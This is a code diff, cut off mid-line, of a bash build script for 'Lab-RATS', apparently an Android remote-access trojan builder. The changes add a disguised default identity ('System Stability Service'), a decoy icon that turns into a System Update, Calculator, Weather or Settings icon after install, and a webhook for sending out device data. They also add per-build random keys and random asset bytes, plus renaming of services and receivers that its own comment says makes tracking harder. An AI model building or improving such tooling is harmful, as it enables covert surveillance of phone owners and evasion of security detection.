@@ -1,11 +1,12 @@
 #!/bin/bash
 
 #################################################
-#          Lab-RATS APK BUILDER - Linux/Mac       #
-#                   v2.0                        #
+#                   Lab-RATS                    #
 #                                               #
-#  Developed by: Lab-RATS.LABS         #
-#  GitHub: github.com/Lab-RATS-LABS      #
+#        Android APK BUILDER - Linux/Mac        #
+#                v1.5.1 Hardened                #
+#                                               #
+#             Developed by: K4N3CO              #
 #################################################
 
 # Colors for output
@@ -23,27 +24,44 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
 CONFIG_FILE="$SCRIPT_DIR/build_config.txt"
 
-# Default logos
-DEFAULT_LOGO="$PROJECT_DIR/app_logo.png"
-COVERT_LOGO="$SCRIPT_DIR/covert_launcher.png"
-
 # Banner
 print_banner() {
     clear
     echo -e "${CYAN}"
-    echo " ┌──────────────────────────────────────────────────────────────┐"
-    echo " │                                                              │"
-    echo " │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │"
-    echo " │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │"
-    echo " │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │"
-    echo " │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │"
-    echo " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │"
-    echo " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │"
-    echo " │                                                              │"
-    echo " │ PROJECT: Lab-RATS APK Builder | v1.4.5 Hardened              │"
-    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-RATS           │"
-    echo " │                                                              │"
-    echo " └──────────────────────────────────────────────────────────────┘"
+    echo " ┌───────────────────────────────────────────────────────────────────────┐"
+    echo " │                                  .-         .                         │"
+    echo " │                               ....-        :                          │"
+    echo " │                            -==--+:.+. ..  -..+:-+                     │"
+    echo " │                            ++---:+.-==+==#:.+---+#                    │"
+    echo " │                             :=---:+++++=++=**-:-:                     │"
+    echo " │                               --+++:-=+++++++-=                       │"
+    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
+    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
+    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
+    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
+    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
+    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
+    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
+    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
+    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
+    echo " │                   --------=--:=:-:-====+++-                           │"
+    echo " │                       .--++++--++:+++==:=+.                           │"
+    echo " │                        .:+++::::--:..:-+=                             │"
+    echo " │                       .--=+=-+-+    -:---*---                         │"
+    echo " │                                                                       │"
+    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
+    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
+    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
+    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"  
+    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
+    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"                                                                                                          
+    echo " │                                                                       │"
+    echo " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │"
+    echo " │                                                                       │" 
+    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
+    echo " │                         DEVELOPED BY K4N3CO                           │"
+    echo " │                               © 2026                                  │"
+    echo " └───────────────────────────────────────────────────────────────────────┘"
     echo -e "${NC}"
     echo ""
 }
@@ -52,708 +70,461 @@ print_banner() {
 detect_os() {
     if [[ "$OSTYPE" == "linux-gnu"* ]]; then
         OS="linux"
-        PKG_MANAGER=""
-        if command -v apt-get &> /dev/null; then
-            PKG_MANAGER="apt"
-        elif command -v yum &> /dev/null; then
-            PKG_MANAGER="yum"
-        elif command -v dnf &> /dev/null; then
-            PKG_MANAGER="dnf"
-        elif command -v pacman &> /dev/null; then
-            PKG_MANAGER="pacman"
-        fi
     elif [[ "$OSTYPE" == "darwin"* ]]; then
         OS="mac"
-        if command -v brew &> /dev/null; then
-            PKG_MANAGER="brew"
-        fi
     else
-        OS="unknown"
+        OS="linux" # Fallback
     fi
 }
 
-# Auto-install Java
-install_java() {
-    echo -e "${CYAN}[*] Attempting to install Java automatically...${NC}"
-    echo ""
-    
-    case $PKG_MANAGER in
-        apt)
-            echo -e "${YELLOW}[>] Running: sudo apt update && sudo apt install -y openjdk-11-jdk${NC}"
-            sudo apt update && sudo apt install -y openjdk-11-jdk
-            ;;
-        yum)
-            echo -e "${YELLOW}[>] Running: sudo yum install -y java-11-openjdk-devel${NC}"
-            sudo yum install -y java-11-openjdk-devel
-            ;;
-        dnf)
-            echo -e "${YELLOW}[>] Running: sudo dnf install -y java-11-openjdk-devel${NC}"
-            sudo dnf install -y java-11-openjdk-devel
-            ;;
-        pacman)
-            echo -e "${YELLOW}[>] Running: sudo pacman -S --noconfirm jdk11-openjdk${NC}"
-            sudo pacman -S --noconfirm jdk11-openjdk
-            ;;
-        brew)
-            echo -e "${YELLOW}[>] Running: brew install openjdk@11${NC}"
-            brew install openjdk@11
-            echo 'export PATH="/usr/local/opt/openjdk@11/bin:$PATH"' >> ~/.zshrc
-            export PATH="/usr/local/opt/openjdk@11/bin:$PATH"
-            ;;
-        *)
-            echo -e "${RED}[!] Cannot auto-install. Please install Java manually.${NC}"
-            return 1
-            ;;
-    esac
-    
-    if command -v java &> /dev/null; then
-        echo -e "${GREEN}[✓] Java installed successfully!${NC}"
-        return 0
+detect_os
+
+# Portable sed in-place
+sed_i() {
+    if [ "$OS" == "mac" ]; then
+        sed -i '' "$@"
     else
-        return 1
+        sed -i "$@"
     fi
 }
 
 # Check requirements
 check_requirements() {
     echo -e "${CYAN}[*] Checking requirements...${NC}"
-    echo ""
-    
     detect_os
-    echo -e "${BLUE}    OS Detected: $OS${NC}"
-    
+
     # Check Java
     if ! command -v java &> /dev/null; then
-        echo -e "${RED}[!] Java is not installed.${NC}"
-        echo ""
-        echo -e "${RED}[>] Options:${NC}"
-        echo "    1. Auto-install Java (requires sudo)"
-        echo "    2. Show manual installation instructions"
-        echo "    3. Skip (I'll install later)"
-        echo ""
-        read -p "    Choose option (Default 1): " JAVA_OPTION
-        JAVA_OPTION=${JAVA_OPTION:-1}
-        
-        case $JAVA_OPTION in
-            1)
-                install_java
-                if [ $? -ne 0 ]; then
-                    show_manual_java_install
-                    exit 1
-                fi
-                ;;
-            2)
-                show_manual_java_install
-                exit 1
-                ;;
-            3)
-                echo -e "${YELLOW}[!] Skipping Java check. Build may fail.${NC}"
-                ;;
-        esac
-    else
-        JAVA_VERSION=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2)
-        echo -e "${GREEN}[✓] Java found: $JAVA_VERSION${NC}"
+        echo -e "${RED}[!] Java is missing. Please install JDK 17 or 21.${NC}"
+        return 1
     fi
-    
-    # Check keytool
-    if command -v keytool &> /dev/null; then
-        echo -e "${GREEN}[✓] keytool found${NC}"
-    else
-        echo -e "${YELLOW}[!] keytool not found. Usually comes with JDK.${NC}"
-    fi
-    
-    # Check ImageMagick
-    if command -v convert &> /dev/null; then
-        echo -e "${GREEN}[✓] ImageMagick found (logo resizing enabled)${NC}"
-        HAS_IMAGEMAGICK=true
-    else
-        echo -e "${YELLOW}[!] ImageMagick not found (optional - for logo resizing)${NC}"
-        echo -e "${YELLOW}    Install: sudo apt install imagemagick (Linux) / brew install imagemagick (Mac)${NC}"
-        HAS_IMAGEMAGICK=false
-    fi
-    
-    echo ""
-}
 
-# Show manual Java installation instructions
-show_manual_java_install() {
-    echo ""
-    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗${NC}"
-    echo -e "${CYAN}║              MANUAL JAVA INSTALLATION GUIDE                  ║${NC}"
-    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════╝${NC}"
-    echo ""
-    echo -e "${WHITE}Ubuntu/Debian:${NC}"
-    echo "    sudo apt update"
-    echo "    sudo apt install openjdk-11-jdk"
-    echo ""
-    echo -e "${WHITE}Fedora/RHEL:${NC}"
-    echo "    sudo dnf install java-11-openjdk-devel"
-    echo ""
-    echo -e "${WHITE}Arch Linux:${NC}"
-    echo "    sudo pacman -S jdk11-openjdk"
-    echo ""
-    echo -e "${WHITE}macOS (Homebrew):${NC}"
-    echo "    brew install openjdk@11"
-    echo "    echo 'export PATH=\"/usr/local/opt/openjdk@11/bin:\$PATH\"' >> ~/.zshrc"
-    echo ""
-    echo -e "${WHITE}Manual Download:${NC}"
-    echo "    https://adoptium.net/temurin/releases/"
-    echo ""
-    echo -e "${YELLOW}After installing, run this script again.${NC}"
-    echo ""
+    JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f1)
+    # Handle version like "1.8.x"
+    if [ "$JAVA_VER" == "1" ]; then
+        JAVA_VER=$(java -version 2>&1 | head -n 1 | cut -d'"' -f2 | cut -d'.' -f2)
+    fi
+
+    echo -e "${GREEN}[✓] Java version $JAVA_VER detected${NC}"
+
+    if [ "$JAVA_VER" -gt 21 ]; then
+        echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is very new. Recommended: 17 or 21.${NC}"
+        echo -e "${YELLOW}    Build may fail with 'Unsupported class file major version'.${NC}"
+    elif [ "$JAVA_VER" -lt 17 ]; then
+        echo -e "${YELLOW}[!] WARNING: Java $JAVA_VER is old. Recommended: 17 or 21.${NC}"
+    fi
+
+    # Check for build tools
+    if ! command -v bc &> /dev/null && ! command -v awk &> /dev/null; then
+        echo -e "${RED}[!] Both 'bc' and 'awk' are missing. Please install at least one.${NC}"
+        return 1
+    fi
+
+    # Check Gradle executable
+    if [ ! -f "$PROJECT_DIR/gradlew" ]; then
+        echo -e "${RED}[!] gradlew not found in $PROJECT_DIR${NC}"
+        return 1
+    fi
+    chmod +x "$PROJECT_DIR/gradlew"
+
+    echo -e "${GREEN}[✓] Requirements satisfied${NC}"
 }
 
 # Generate keystore
-# Pass "auto" as argument for auto-generation with defaults
 generate_keystore() {
     local AUTO_MODE="$1"
-    
     KEYSTORE_PATH="$PROJECT_DIR/lab-rats-keystore.jks"
-    KEYSTORE_PROPS="$PROJECT_DIR/keystore.properties"
-    
-    # Default values
-    KEY_ALIAS="lab-rats-key"
-    KEYSTORE_PASS="lab-rats123"
-    CN_NAME="Lab-RATS Developer"
-    ORG_NAME="Lab-RATS.LABS"
-    COUNTRY="US"
-    VALIDITY_DAYS=9125  # 25 years
-    
+    if [ -f "$KEYSTORE_PATH" ] && [ "$AUTO_MODE" == "auto" ]; then return; fi
+
     if [ -f "$KEYSTORE_PATH" ]; then
-        if [ "$AUTO_MODE" = "auto" ]; then
-            echo -e "${GREEN}[OK] Keystore already exists${NC}"
-            return
-        fi
-        echo -e "${YELLOW}[!] Keystore already exists at: $KEYSTORE_PATH${NC}"
+        echo -e "${YELLOW}[!] Keystore already exists.${NC}"
         read -p "    Generate new keystore? (y/N): " REGENERATE
-        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then
-            echo -e "${GREEN}[OK] Using existing keystore${NC}"
-            
-            # Load existing config
-            if [ -f "$CONFIG_FILE" ]; then
-                source "$CONFIG_FILE"
-            fi
-            return
-        fi
+        if [[ ! "$REGENERATE" =~ ^[Yy]$ ]]; then return; fi
         rm -f "$KEYSTORE_PATH"
     fi
     
-    if [ "$AUTO_MODE" != "auto" ]; then
-        echo -e "${CYAN}[*] Keystore Configuration${NC}"
-        echo ""
-        echo -e "${RED}[>] Enter keystore details (press Enter for defaults):${NC}"
-        echo ""
-        
-        read -p "    Key alias [$KEY_ALIAS]: " INPUT
-        [ -n "$INPUT" ] && KEY_ALIAS="$INPUT"
-        
-        read -sp "    Keystore password [$KEYSTORE_PASS]: " INPUT
-        echo ""
-        [ -n "$INPUT" ] && KEYSTORE_PASS="$INPUT"
-        
-        read -p "    Your name [$CN_NAME]: " INPUT
-        [ -n "$INPUT" ] && CN_NAME="$INPUT"
-        
-        read -p "    Organization [$ORG_NAME]: " INPUT
-        [ -n "$INPUT" ] && ORG_NAME="$INPUT"
-        
-        read -p "    Country code [$COUNTRY]: " INPUT
-        [ -n "$INPUT" ] && COUNTRY="$INPUT"
-    else
-        echo -e "${CYAN}[*] Auto-generating keystore with default values...${NC}"
-    fi
+    echo -e "${CYAN}[*] Keystore Configuration${NC}"
+    read -p "    Key alias [lab-rats-key]: " ALIAS; ALIAS=${ALIAS:-lab-rats-key}
+    read -p "    Password [lab-rats123]: " PASS; PASS=${PASS:-lab-rats123}
+
+    keytool -genkeypair -alias "$ALIAS" -keyalg RSA -keysize 2048 -validity 9125 -keystore "$KEYSTORE_PATH" -storepass "$PASS" -keypass "$PASS" -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>/dev/null
     
-    echo ""
-    echo -e "${CYAN}[*] Generating keystore...${NC}"
-    
-    keytool -genkeypair \
-        -alias "$KEY_ALIAS" \
-        -keyalg RSA \
-        -keysize 2048 \
-        -validity $VALIDITY_DAYS \
-        -keystore "$KEYSTORE_PATH" \
-        -storepass "$KEYSTORE_PASS" \
-        -keypass "$KEYSTORE_PASS" \
-        -dname "CN=$CN_NAME, O=$ORG_NAME, C=$COUNTRY" \
-        2>/dev/null
-    
-    if [ $? -eq 0 ]; then
-        echo -e "${GREEN}[OK] Keystore generated successfully!${NC}"
-        echo ""
-        
-        # Create keystore.properties for Gradle
-        cat > "$KEYSTORE_PROPS" << EOF
+    cat > "$PROJECT_DIR/keystore.properties" << EOF
 storeFile=lab-rats-keystore.jks
-storePassword=$KEYSTORE_PASS
-keyAlias=$KEY_ALIAS
-keyPassword=$KEYSTORE_PASS
+storePassword=$PASS
+keyAlias=$ALIAS
+keyPassword=$PASS
 EOF
-        echo -e "${GREEN}[OK] Created keystore.properties for Gradle${NC}"
-        
-        # Save to config
-        echo "KEYSTORE_PATH=$KEYSTORE_PATH" > "$CONFIG_FILE"
-        echo "KEY_ALIAS=$KEY_ALIAS" >> "$CONFIG_FILE"
-        echo "KEYSTORE_PASS=$KEYSTORE_PASS" >> "$CONFIG_FILE"
-        
-        if [ "$AUTO_MODE" != "auto" ]; then
-            # Show certificate info
-            echo -e "${CYAN}[*] Certificate SHA-256 fingerprint:${NC}"
-            keytool -list -v -keystore "$KEYSTORE_PATH" -storepass "$KEYSTORE_PASS" -alias "$KEY_ALIAS" 2>/dev/null | grep "SHA256:"
-            echo ""
-        fi
-    else
-        echo -e "${RED}[!] Failed to generate keystore${NC}"
-        [ "$AUTO_MODE" != "auto" ] && exit 1
-    fi
-}
-
-# Configure logo
-configure_logo() {
-    echo -e "${CYAN}[*] Logo Configuration${NC}"
-    echo ""
-    
-    RES_DIR="$PROJECT_DIR/app/src/main/res"
-    
-    echo "    1. Use System-Style Stealth logo (covert_launcher.png)"
-    echo "    2. Use default Lab-RATS logo (app_logo.png)"
-    echo "    3. Use custom logo (provide image path)"
-    echo "    4. Skip (Keep project icons as is)"
-    echo ""
-    read -p "    Choose option (Default 1): " LOGO_OPTION
-    LOGO_OPTION=${LOGO_OPTION:-1}
-    
-    LOGO_PATH=""
-    
-    case $LOGO_OPTION in
-        1)
-            if [ -f "$COVERT_LOGO" ]; then
-                LOGO_PATH="$COVERT_LOGO"
-                echo -e "${GREEN}[✓] Using Stealth logo${NC}"
-            else
-                echo -e "${RED}[!] Stealth logo not found at: $COVERT_LOGO${NC}"
-                return
-            fi
-            ;;
-        2)
-            if [ -f "$DEFAULT_LOGO" ]; then
-                LOGO_PATH="$DEFAULT_LOGO"
-                echo -e "${GREEN}[✓] Using default Lab-RATS logo${NC}"
-            else
-                echo -e "${RED}[!] Default logo not found at: $DEFAULT_LOGO${NC}"
-                return
-            fi
-            ;;
-        3)
-            read -p "    Enter path to logo image (PNG, 512x512): " CUSTOM_LOGO
-            if [ -f "$CUSTOM_LOGO" ]; then
-                LOGO_PATH="$CUSTOM_LOGO"
-            else
-                echo -e "${RED}[!] Logo file not found: $CUSTOM_LOGO${NC}"
-                return
-            fi
-            ;;
-        4)
-            echo -e "${GREEN}[✓] No changes made to icons${NC}"
-            return
-            ;;
-    esac
-    
-    if [ -n "$LOGO_PATH" ]; then
-        echo ""
-        read -p "    Make background transparent (removes white)? (y/N): " TRANSPARENT
-        
-        echo -e "${CYAN}[*] Processing logo...${NC}"
-        
-        # KEY FIX: Only remove adaptive icons if we are replacing them with a legacy PNG
-        if [ "$LOGO_OPTION" != "4" ] && [ -d "$RES_DIR/mipmap-anydpi-v26" ]; then
-            rm -rf "$RES_DIR/mipmap-anydpi-v26"
-            echo -e "${YELLOW}[*] Removed adaptive icon config to apply custom legacy icon${NC}"
-        fi
-
-        # Only clean up if we are actually providing a new logo
-        if [ "$LOGO_OPTION" != "4" ]; then
-            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
-                rm -f "$RES_DIR/$density/ic_launcher.png" "$RES_DIR/$density/ic_launcher.webp" 2>/dev/null
-                rm -f "$RES_DIR/$density/ic_launcher_round.png" "$RES_DIR/$density/ic_launcher_round.webp" 2>/dev/null
-                rm -f "$RES_DIR/$density/ic_launcher_foreground.png" "$RES_DIR/$density/ic_launcher_foreground.webp" 2>/dev/null
-            done
-            echo -e "${YELLOW}[*] Cleaned up old icon resources for replacement${NC}"
-        fi
-
-        # Check ImageMagick again just to be sure
-        HAS_IMAGEMAGICK=false
-        if command -v convert &> /dev/null; then
-            HAS_IMAGEMAGICK=true
-        fi
-        
-        # Copy to different sizes
-        if [ "$HAS_IMAGEMAGICK" = true ]; then
-            # High-quality resize with 3% Zoom Out for Stealth Icon
-            # We scale the image so that it is 97% of the TARGET pixel size, then center in the box.
-            for density_size in "mdpi:48" "hdpi:72" "xhdpi:96" "xxhdpi:144" "xxxhdpi:192"; do
-                IFS=":" read -r density size <<< "$density_size"
-                if [ "$LOGO_OPTION" -eq 1 ]; then
-                    local ZOOM_PX=$(( size * 100 / 100 ))
-                    convert "$LOGO_PATH" -resize "${ZOOM_PX}x${ZOOM_PX}" -gravity center -extent "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher.png" 2>/dev/null
-                    convert "$LOGO_PATH" -resize "${ZOOM_PX}x${ZOOM_PX}" -gravity center -extent "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher_round.png" 2>/dev/null
-                else
-                    convert "$LOGO_PATH" -resize "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher.png" 2>/dev/null
-                    convert "$LOGO_PATH" -resize "${size}x${size}" "$RES_DIR/mipmap-$density/ic_launcher_round.png" 2>/dev/null
-                fi
-            done
-
-            echo -e "${GREEN}[✓] Logo zoomed and resized correctly${NC}"
-        else
-            echo -e "${YELLOW}[!] ImageMagick not found. Falling back to simple copy.${NC}"
-            echo -e "${YELLOW}    Note: Install ImageMagick to enable resizing and transparency.${NC}"
-            
-            # Just copy to all folders without resize
-            for density in mipmap-mdpi mipmap-hdpi mipmap-xhdpi mipmap-xxhdpi mipmap-xxxhdpi; do
-                mkdir -p "$RES_DIR/$density"
-                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher.png" 2>/dev/null
-                cp "$LOGO_PATH" "$RES_DIR/$density/ic_launcher_round.png" 2>/dev/null
-            done
-            echo -e "${GREEN}[✓] Logo copied (No resize)${NC}"
-        fi
-    fi
-    echo ""
+    echo -e "${GREEN}[✓] Keystore ready${NC}"
 }
 
 # Configure app settings
 configure_app() {
     echo -e "${CYAN}[*] App Configuration${NC}"
-    echo ""
-    
-    STRINGS_FILE="$PROJECT_DIR/app/src/main/res/values/strings.xml"
-    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
-    
-    # Generate random defaults
-    RAND_MAJOR=$((1 + RANDOM % 10))
-    RAND_MINOR=$((RANDOM % 10))
-    RAND_PATCH=$((RANDOM % 10))
-    RAND_VER_NAME="$RAND_MAJOR.$RAND_MINOR.$RAND_PATCH"
-    RAND_VER_CODE=$((10 + RANDOM % 990))
-    
-    # Package Name
-    read -p "    Enter Package Name (Application ID) [com.android.system.stability]: " PKG_NAME
-    PKG_NAME=${PKG_NAME:-com.android.system.stability}
-    
-    # App name
+    RAND_V="$((1 + RANDOM % 4)).$((RANDOM % 10)).$((RANDOM % 10))"
+
     read -p "    Enter App Name [System Stability Service]: " APP_NAME
     APP_NAME=${APP_NAME:-System Stability Service}
+
+    read -p "    Enter Package ID [com.android.system.stability]: " PKG_NAME
+    PKG_NAME=${PKG_NAME:-com.android.system.stability}
+
+    read -p "    Enter Version Name [$RAND_V]: " VERSION_NAME
+    VERSION_NAME=${VERSION_NAME:-$RAND_V}
+
+    read -p "    Enter Min SDK [21]: " MIN_SDK
+    MIN_SDK=${MIN_SDK:-21}
+
+    echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
+    echo -e "${YELLOW}    (The app logo will transform into your selection immediately after install on device)${NC}"
+    echo "    1. System Update (Gear)  2. Calculator"
+    echo "    3. Weather               4. Settings"
+    echo "    5. Lab-RATS Logo"
+    read -p "    Choice (Default 1): " DECOY_CHOICE
+    DECOY_CHOICE=${DECOY_CHOICE:-1}
+
+    BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
+    sed_i "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
+    sed_i "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
+    sed_i "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
+    sed_i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|g" "$PROJECT_DIR/app/src/main/res/values/strings.xml"
     
-    # Min SDK
-    read -p "    Enter Min SDK [26]: " MIN_SDK
-    MIN_SDK=${MIN_SDK:-26}
-    
-    # Version Name
-    read -p "    Enter Version Name (Random: $RAND_VER_NAME) [$RAND_VER_NAME]: " VERSION_NAME
-    VERSION_NAME=${VERSION_NAME:-$RAND_VER_NAME}
-    
-    # Version Code
-    read -p "    Enter Version Code (Random: $RAND_VER_CODE) [$RAND_VER_CODE]: " VERSION_CODE
-    VERSION_CODE=${VERSION_CODE:-$RAND_VER_CODE}
-    
-    # Update build.gradle
-    if [ -f "$BUILD_GRADLE" ]; then
-        # Update Application ID
-        sed -i.bak "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
-        
-        # Update Min SDK
-        sed -i.bak "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
-        
-        # Update Version Code and Name
-        sed -i.bak "s|versionCode [0-9]*|versionCode $VERSION_CODE|g" "$BUILD_GRADLE"
-        sed -i.bak "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
-        
-        rm -f "${BUILD_GRADLE}.bak"
-        echo -e "${GREEN}[✓] build.gradle updated (Pkg: $PKG_NAME, MinSdk: $MIN_SDK, Ver: $VERSION_NAME)${NC}"
-    fi
-    
-    # Update strings.xml
-    if [ -f "$STRINGS_FILE" ]; then
-        ESCAPED_NAME=$(echo "$APP_NAME" | sed 's/[&/\]/\\&/g')
-        sed -i.bak "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$ESCAPED_NAME</string>|g" "$STRINGS_FILE"
-        rm -f "${STRINGS_FILE}.bak"
-        echo -e "${GREEN}[✓] App name set to: $APP_NAME${NC}"
-    fi
-    
-    # Save to config
-    echo "APP_NAME=\"$APP_NAME\"" > "$CONFIG_FILE"
+    echo "PKG_NAME=\"$PKG_NAME\"" > "$CONFIG_FILE"
+    echo "APP_NAME=\"$APP_NAME\"" >> "$CONFIG_FILE"
     echo "VERSION_NAME=\"$VERSION_NAME\"" >> "$CONFIG_FILE"
-    echo "VERSION_CODE=\"$VERSION_CODE\"" >> "$CONFIG_FILE"
-    echo "PKG_NAME=\"$PKG_NAME\"" >> "$CONFIG_FILE"
-    
-    # Google Sheet URL
-    echo ""
-    echo -e "${RED}[>] Google Sheet Webhook Configuration${NC}"
-    echo -e "${YELLOW}    This URL will receive device data when app starts.${NC}"
-    echo -e "${YELLOW}    You need to set up Google Sheet manually (see README).${NC}"
-    echo -e "${YELLOW}    Leave empty to skip.${NC}"
-    echo ""
-    read -p "    Enter Google Sheet webhook URL: " SHEET_URL
-    
-    LOCAL_PROPS="$PROJECT_DIR/local.properties"
-    if [ -n "$SHEET_URL" ]; then
-        echo "SHEET_URL=\"$SHEET_URL\"" >> "$CONFIG_FILE"
+    echo "MIN_SDK=\"$MIN_SDK\"" >> "$CONFIG_FILE"
+    echo "DECOY_CHOICE=\"$DECOY_CHOICE\"" >> "$CONFIG_FILE"
 
-        # Update local.properties for Gradle
-        if grep -q "WEBHOOK_URL=" "$LOCAL_PROPS" 2>/dev/null; then
-            sed -i.bak "s|WEBHOOK_URL=.*|WEBHOOK_URL=$SHEET_URL|g" "$LOCAL_PROPS"
-            rm -f "${LOCAL_PROPS}.bak"
-        else
-            echo "WEBHOOK_URL=$SHEET_URL" >> "$LOCAL_PROPS"
-        fi
-        echo -e "${GREEN}[✓] Google Sheet URL saved to config and local.properties${NC}"
+    read -p "    Enter Webhook URL (Google Script): " WEB_URL
+    if [ -n "$WEB_URL" ]; then
+        # Use a different delimiter for sed in case URL contains |
+        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
-        echo -e "${YELLOW}[!] Skipping Google Sheet configuration${NC}"
+        # Ensure it's at least empty if not set, without corrupting
+        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
     fi
 
-    echo ""
-}
+    # Persist Decoy Choice for build.gradle
+    if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
+        sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
+    else
+        echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
+    fi
 
-# Progress bar function
-show_progress() {
-    local duration=$1
-    local label=$2
-    local steps=20
-    local sleep_time=$(echo "scale=2; $duration / $steps" | bc)
+    # Generate Dynamic Encryption Key for every build
+    RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
+    if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
+        sed_i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
+    else
+        echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
+    fi
 
-    echo -ne "    $label ["
-    for ((i=1; i<=steps; i++)); do
-        echo -ne "█"
-        local percentage=$((i * 100 / steps))
-        echo -ne "]"
-        echo -ne " $percentage% "
-        # Backtrack to overwrite
-        for ((j=1; j<=i+7; j++)); do echo -ne "\b"; done
-        echo -ne "["
-        for ((j=1; j<=i; j++)); do echo -ne "█"; done
-
-        sleep $sleep_time
+    # Add Binary Signature Entropy (Unique build hash)
+    mkdir -p "$PROJECT_DIR/app/src/main/assets/sys"
+    for i in {1..3}; do
+        head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
     done
-    echo -ne "█] 100% "
-    echo ""
+
+    # Randomize Service Labels and Class Names in Manifest
+    MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
+
+    # 1. Randomize Labels
+    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service" "Process Manager" "Resource Monitor" "Connectivity Host")
+    for i in {1..5}; do
+        RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
+        # Just randomizing some labels, not all to avoid breaking user choice if they set one
+    done
+
+    # 2. Randomize Service/Receiver names (High Priority Obfuscation)
+    # We will use a unique prefix per build to make tracking harder
+    PREFIX=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 4)
+
+    # We will replace these strings throughout the source before build and revert after
+    # Using placeholders to track changes
+    ENTITIES=("WorkManager_Sync" "Analytics_Provider" "MediaFrameworkService" "StatusNotification" "IO_Persistence_Manager" "TelephonyState" "SystemBoot" "InstallReferrerReceiver")
+
+    # Store the mapping in a temporary file to allow reverting later
+    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
+    > "$MAPPING_FILE"
+
+    for ENTITY in "${ENTITIES[@]}"; do
+        RAND_NAME="${PREFIX}_$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 8)"
+        echo "$ENTITY:$RAND_NAME" >> "$MAPPING_FILE"
+
+        # Update Manifest
+        sed_i "s|\.$ENTITY|.$RAND_NAME|g" "$MANIFEST"
+        # Update all Java files
+        if [ "$OS" == "mac" ]; then
+            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$ENTITY/$RAND_NAME/g" {} +
+        else
